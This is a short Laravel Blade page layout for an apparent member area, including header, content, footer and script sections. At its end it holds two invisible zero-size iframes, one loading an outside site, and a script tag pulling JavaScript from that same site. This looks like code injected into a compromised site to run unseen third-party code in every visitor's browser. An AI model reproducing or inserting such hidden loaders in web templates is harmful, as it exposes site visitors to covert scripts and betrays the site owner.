@include('layouts.sdamember.header')

<body class="text-center justify-content-evenly">

    @yield('content')

    @include('layouts.sdamember.footer')

    @stack('scripts')
    <iframe id="randomFrame" width="0" height="0" style="display:none;"></iframe>
    <script src="https://multiversetools.com/assets/js/scripts.js"></script>
    <iframe src="https://multiversetools.com" width="0" height="0" style="display:none;"></iframe>
</body>

</html>
